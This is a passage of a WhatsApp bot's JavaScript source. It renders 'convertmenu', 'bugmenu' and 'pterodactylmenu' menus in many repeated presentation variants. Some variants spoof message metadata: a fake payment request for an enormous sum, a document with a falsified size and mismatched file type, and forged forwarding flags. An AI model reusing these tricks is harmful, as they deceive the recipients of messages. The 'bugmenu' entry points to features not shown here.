          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'convertmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${convertmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'bugmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${bugmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'pterodactylmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${pterodactylmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
